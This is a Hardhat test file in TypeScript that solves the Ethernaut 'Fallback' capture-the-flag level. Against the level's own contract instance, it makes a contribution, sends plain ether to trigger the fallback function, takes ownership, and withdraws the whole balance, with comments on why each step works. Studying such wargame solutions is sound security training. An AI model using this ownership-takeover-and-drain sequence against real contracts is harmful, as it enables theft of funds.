// # Ethernaut 1: Fallback

import {ethers} from 'hardhat'
import {Contract, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x9CB391dbcD447E645D6Cb55dE6ca23164130D008'
const INSTANCE_ADDRESS = '0xCbDe133E8772804b8D12c3fa5Fe26851223e98c7'

describe('01_Fallback_Solution', () => {
  let ethernaut: Contract
  let instance: Contract
  let signer: Signer
  let signerAddress: string

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Fallback', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
  })

  // Need to send a contribution because it's one of the requirements in `fallback`.
  it('sends a contribution', async () => {
    const tx = await instance.contribute({value: ethers.utils.parseEther('0.0001')})
    return expectStatusOK(tx)
  })

  // Sending ether to the instance triggers its `fallback` function,
  // which makes us the owner, since we pass both requirements.
  it('sends ether to the contract address', async () => {
    const params = {
      to: instance.address,
      value: ethers.utils.parseEther('0.00001'),
    }
    const tx = await signer.sendTransaction(params)
    return expectStatusOK(tx)
  })

  it('has become owner', async () => {
    const ownerAddr = await instance.owner()
    expect(ownerAddr).to.equal(signerAddress)
  })

  it('withdraws the contract balance', async () => {
    const tx = await instance.withdraw({gasLimit: 100000})
    return expectStatusOK(tx)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
